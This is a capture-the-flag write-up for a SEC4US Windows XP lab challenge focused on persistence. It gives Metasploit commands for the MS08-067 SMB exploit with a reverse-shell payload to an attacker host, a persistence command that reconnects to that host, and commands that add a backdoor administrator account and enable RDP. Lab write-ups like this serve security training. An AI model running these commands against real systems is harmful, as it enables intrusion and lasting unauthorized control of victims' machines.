# Maq104: Insista e Persista neste XP

Writeup for the **Insista e Persista neste XP** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 104

---

## Overview

Another Windows XP target, but this time the challenge emphasizes persistence. Gain initial access and establish a foothold that survives reboots or service restarts.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Identify SMB (445), MSRPC (135), and any other exposed services. Confirm Windows XP via OS fingerprinting.

## Exploitation

Leverage known Windows XP vulnerabilities for initial access:

```bash
msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS [TARGET_IP]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
run
```

## Persistence

Once a Meterpreter session is established, set up persistence:

```bash
run persistence -U -i 10 -p [LPORT] -r [ATTACKER_IP]
```

Alternative methods include adding a user, enabling RDP, or planting a scheduled task:

```bash
net user hacker [PASSWORD] /add
net localgroup administrators hacker /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Search the system for the flag after establishing persistence.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Create Account: Local Account | T1136.001 |
| Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 |
| Scheduled Task/Job | T1053 |

### CWE

- **CWE-120:** Buffer Copy without Checking Size of Input
- **CWE-284:** Improper Access Control

### MITRE D3FEND

- **D3-PSA:** Process Spawn Analysis (detect persistence mechanisms)

---

Persistence is the art of making sure a door, once opened, stays that way. The challenge name is both a hint and a philosophy: insist, persist, and the system remembers you.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
